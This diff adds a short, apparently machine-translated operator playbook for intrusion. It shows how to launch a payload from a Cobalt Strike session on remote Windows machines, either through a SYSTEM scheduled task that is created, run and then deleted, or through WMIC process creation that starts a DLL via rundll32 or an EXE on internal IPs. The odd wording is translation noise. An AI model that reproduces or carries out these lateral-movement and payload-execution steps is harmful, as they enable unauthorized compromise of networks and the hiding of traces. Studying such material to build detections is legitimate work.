@@ -1,0 +1,30 @@
+Commands for starting the peloid to pull up the session to cobalt
+1)shell SCHTASKS /s MS040926754153 /RU "SYSTEM" /create /tn "WindowsSensor15" /tr "cmd.exe /c C:\ProgramData\P32.exe" /sc ONCE /sd 01/01/1970 /st 00:00
+2)shell SCHTASKS /s MS040926754153 /run /TN "WindowsSensor15"
+3)shell schtasks /S MS040926754153 /TN "WindowsSensor15" /DELETE /F
+instead of
+MS040926754153
+insert
+ipak cars
+take turns pounding the commands
+1) creating a task with a payload
+2) cutting
+3) deletion
+
+
+We use it more often when launching VMIKOM
+1) if it is DLL, then
+shell wmic /node:192.168.104.13 process call create "rundll32.exe C:\ProgramData\x64.dll StartW"
+
+Accordingly, where is the ip, we insert the ip of the machine to which we have access, then the path and the name of our dll goes, I think the syntax is clear
+
+If you are on the RDP> open CMD from the administrator and rundll32.exe C:\ProgramData\x64.dll, StartW you can specify any path according to where your dll is located
+
+
+For EXE or .bat format, launch VMIKOM like this
+
+shell wmic /node:10.28.0.3 process call create "C:\ProgramData\j1.exe"
+
+
+
+You can also download and run through the metasploit, but now we rarely use launch and load using this tool, since it does not work correctly in the latest version
